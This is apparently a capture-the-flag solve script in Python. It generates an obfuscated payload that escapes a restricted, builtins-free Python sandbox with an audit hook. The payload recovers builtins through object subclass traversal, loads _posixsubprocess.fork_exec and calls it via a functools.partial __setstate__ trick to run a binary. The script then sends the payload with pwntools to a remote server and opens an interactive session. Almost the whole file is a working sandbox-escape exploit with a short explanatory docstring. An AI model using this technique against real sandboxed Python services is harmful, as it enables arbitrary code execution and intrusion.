def n(a):
    if a == 0: return "z"
    return '+'.join(["o"]*a)
alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"

def s(str):
    return "+".join([f"alphabet[{n(alphabet.find(c))}]" for c in str])

leak_builtins_keys = ['__name__', '__doc__', '__package__', '__loader__', '__spec__', '__build_class__', '__import__', 'abs', 'all', 'any', 'ascii', 'bin', 'breakpoint', 'callable', 'chr', 'compile', 'delattr', 'dir', 'divmod', 'eval', 'exec', 'format', 'getattr', 'globals', 'hasattr', 'hash', 'hex', 'id', 'input', 'isinstance', 'issubclass', 'iter', 'aiter', 'len', 'locals', 'max', 'min', 'next', 'anext', 'oct', 'ord', 'pow', 'print', 'repr', 'round', 'setattr', 'sorted', 'sum', 'vars', 'None', 'Ellipsis', 'NotImplemented', 'False', 'True', 'bool', 'memoryview', 'bytearray', 'bytes', 'classmethod', 'complex', 'dict', 'enumerate', 'filter', 'float', 'frozenset', 'property', 'int', 'list', 'map', 'object', 'range', 'reversed', 'set', 'slice', 'staticmethod', 'str', 'super', 'tuple', 'type', 'zip', '__debug__', 'BaseException', 'Exception', 'TypeError', 'StopAsyncIteration', 'StopIteration', 'GeneratorExit', 'SystemExit', 'KeyboardInterrupt', 'ImportError', 'ModuleNotFoundError', 'OSError', 'EnvironmentError', 'IOError', 'EOFError', 'RuntimeError', 'RecursionError', 'NotImplementedError', 'NameError', 'UnboundLocalError', 'AttributeError', 'SyntaxError', 'IndentationError', 'TabError', 'LookupError', 'IndexError', 'KeyError', 'ValueError', 'UnicodeError', 'UnicodeEncodeError', 'UnicodeDecodeError', 'UnicodeTranslateError', 'AssertionError', 'ArithmeticError', 'FloatingPointError', 'OverflowError', 'ZeroDivisionError', 'SystemError', 'ReferenceError', 'MemoryError', 'BufferError', 'Warning', 'UserWarning', 'EncodingWarning', 'DeprecationWarning', 'PendingDeprecationWarning', 'SyntaxWarning', 'RuntimeWarning', 'FutureWarning', 'ImportWarning', 'UnicodeWarning', 'BytesWarning', 'ResourceWarning', 'ConnectionError', 'BlockingIOError', 'BrokenPipeError', 'ChildProcessError', 'ConnectionAbortedError', 'ConnectionRefusedError', 'ConnectionResetError', 'FileExistsError', 'FileNotFoundError', 'IsADirectoryError', 'NotADirectoryError', 'InterruptedError', 'PermissionError', 'ProcessLookupError', 'TimeoutError', 'open', 'quit', 'exit', 'copyright', 'credits', 'license', 'help']

"""
Combine filter evasion techniques from PyMagic with C audit_sandbox bypass technique.
High Level Idea:
    -   To bypass c audit_sandbox, we can use _posixsubprocess.fork_exec, but how to get this?

    -   Although builtins are gone, you dont really need the builtins actual functionalities, 
        but rather just enough functionality to get past the python portion of load_module.
        Once load_module calls the underlying c implementation, it will be loaded

    -   Looking through the source code, its possible to restore:
        - DeprecationWarning = DeprecationWarning
        - getattr = lambda *a: None
        - hasattr = lambda *a: True
        - ImportError = AttributeError
        - KeyError = KeyError
        - tuple = lambda *a: _.__name__
        Which is sufficient to load a module.

    -   The Exception and Warning objects can be found by traversing the subclasses
        starting from BaseException which is in object.__subclasses__()

    -   Finally, in order to call a function 20 something arguments, we can use a functools.reduce
        object, which is accessable from obj_subclasses. With this we can call the function,
        and call the readflag binary.

        
There were significantly easier ways however since the audit sandbox did not blacklist exec and compile.
Due to this you can recover eval and use that to gather primitives.
"""
code = ("""
{
...: [z:=False],
...: [o:=True],
...: [n:=z-o],
...: [alphabet:=_.__name__],
...: [obj:=_[_] for _.__class_getitem__ in [_.__new__]],
...: [obj_subclasses:=[+obj][z] for _.__pos__ in [_.__class__.__base__.__subclasses__]],

...: [str_BuiltinImporter:="""+s('BuiltinImporter')+"""],
...: [BuiltinImporter:=[q for q in obj_subclasses if str_BuiltinImporter == q.__name__][z]],

...: [str_BaseException:="""+s('BaseException')+"""],
...: [BaseException:=[q for q in obj_subclasses if str_BaseException == q.__name__][z]],

...: [str_tuple:="""+s('tuple')+"""],
...: [tuple:=[q for q in obj_subclasses if str_tuple == q.__name__][z]],

...: [str_partial:="""+s('partial')+"""],
...: [partial:=[q for q in obj_subclasses if str_partial == q.__name__][z]],

...: [load_module:=BuiltinImporter.load_module],

...: [str_ModuleSpec:="""+s('ModuleSpec')+"""],
...: [ModuleSpec:=[q for q in obj_subclasses if str_ModuleSpec == q.__name__][z]],
...: [ModuleSpec_globals_f_get:=ModuleSpec.__init__.__globals__.get],

...: [builtins:=obj.__builtins__ for _.__getattr__ in [ModuleSpec_globals_f_get]],
...: [builtins_keys:=[*[+obj][z]] for _.__pos__ in [builtins.keys]],

...: [BaseException_subclasses:=[+obj][z] for _.__pos__ in [BaseException.__subclasses__]],
...: [Exception:=BaseException_subclasses[z]],
...: [Exception_subclasses:=[+obj][z] for _.__pos__ in [Exception.__subclasses__]],

...: [str_AttributeError:="""+s('AttributeError')+"""],
...: [AttributeError:=[q for q in Exception_subclasses if str_AttributeError == q.__name__][z]],

...: [str_Warning:="""+s('Warning')+"""],
...: [Warning:=[q for q in Exception_subclasses if str_Warning == q.__name__][z]],

...: [DeprecationWarning:=[+obj][False][o+o] for _.__pos__ in [Warning.__subclasses__]],

...: [str_LookupError:="""+s('LookupError')+"""],
...: [LookupError:=[q for q in Exception_subclasses if str_LookupError == q.__name__][z]],

...: [KeyError:=[+obj][False][o] for _.__pos__ in [LookupError.__subclasses__]],
...: [obj[{
    builtins_keys[""" + n(leak_builtins_keys.index('getattr')) + """]: lambda *a: None,
    builtins_keys[""" + n(leak_builtins_keys.index('hasattr')) + """]: lambda *a: True,
    builtins_keys[""" + n(leak_builtins_keys.index('tuple')) + """]: lambda *a: _.__name__,
    builtins_keys[""" + n(leak_builtins_keys.index('DeprecationWarning')) + """]: DeprecationWarning,
    builtins_keys[""" + n(leak_builtins_keys.index('ImportError')) + """]: AttributeError,
    builtins_keys[""" + n(leak_builtins_keys.index('KeyError')) + """]: KeyError,
}] for _.__getitem__ in [builtins.update]],

...: [f_fork_exec:=obj._posixsubprocess.fork_exec for _.__getattr__ in [load_module]],
...: [f_pipe:=obj.os.pipe for _.__getattr__ in [load_module]],
...: [pipe:=[+obj][z] for _.__pos__ in [f_pipe]],

...: [e_tuple:=[+obj][z] for _.__pos__ in [tuple]],

...: [str_readflag:="""+s('readflag')+"""],
...: [readflag_b:=[+obj][z] for _.__pos__ in [str_readflag.encode]],
...: [readflag_l:=[readflag_b]],

...: [fork_exec_args_list:=[]],
...: [obj[readflag_l] for _.__getitem__ in [fork_exec_args_list.append]],
...: [obj[readflag_l] for _.__getitem__ in [fork_exec_args_list.append]],
...: [obj[True] for _.__getitem__ in [fork_exec_args_list.append]],
...: [obj[e_tuple] for _.__getitem__ in [fork_exec_args_list.append]],
...: [obj[None] for _.__getitem__ in [fork_exec_args_list.append]],
...: [obj[None] for _.__getitem__ in [fork_exec_args_list.append]],
...: [obj[n] for _.__getitem__ in [fork_exec_args_list.append]],
...: [obj[n] for _.__getitem__ in [fork_exec_args_list.append]],
...: [obj[n] for _.__getitem__ in [fork_exec_args_list.append]],
...: [obj[n] for _.__getitem__ in [fork_exec_args_list.append]],
...: [obj[n] for _.__getitem__ in [fork_exec_args_list.append]],
...: [obj[n] for _.__getitem__ in [fork_exec_args_list.append]],
...: [obj[pipe[z]] for _.__getitem__ in [fork_exec_args_list.append]],
...: [obj[pipe[o]] for _.__getitem__ in [fork_exec_args_list.append]],
...: [obj[False] for _.__getitem__ in [fork_exec_args_list.append]],
...: [obj[False] for _.__getitem__ in [fork_exec_args_list.append]],
...: [obj[None] for _.__getitem__ in [fork_exec_args_list.append]],
...: [obj[None] for _.__getitem__ in [fork_exec_args_list.append]],
...: [obj[None] for _.__getitem__ in [fork_exec_args_list.append]],
...: [obj[n] for _.__getitem__ in [fork_exec_args_list.append]],
...: [obj[None] for _.__getitem__ in [fork_exec_args_list.append]],

...: [fork_exec_args:=obj[fork_exec_args_list] for _.__getitem__ in [tuple]],

...: [partial_func:=obj[f_fork_exec] for _.__getitem__ in [partial]],
...: [set_state_args_list:=[]],
...: [obj[f_fork_exec] for _.__getitem__ in [set_state_args_list.append]],
...: [obj[fork_exec_args] for _.__getitem__ in [set_state_args_list.append]],
...: [obj[{}] for _.__getitem__ in [set_state_args_list.append]],
...: [obj[{}] for _.__getitem__ in [set_state_args_list.append]],
...: [set_state_args:=obj[set_state_args_list] for _.__getitem__ in [tuple]],

...: [obj[set_state_args] for _.__getitem__ in [partial_func.__setstate__]],
...: [+obj for _.__pos__ in [partial_func]],
...: {}[fork_exec_args]
}""").replace('\n','').replace(' ','\t')

with open('solve.txt', 'w') as f:
    f.write(code)


from pwn import *

p = remote("34.139.98.117", 6669)
p.recvuntil(b'>>> ')
p.sendline(code.encode())
p.interactive()
print(p.recvall())
p.close()
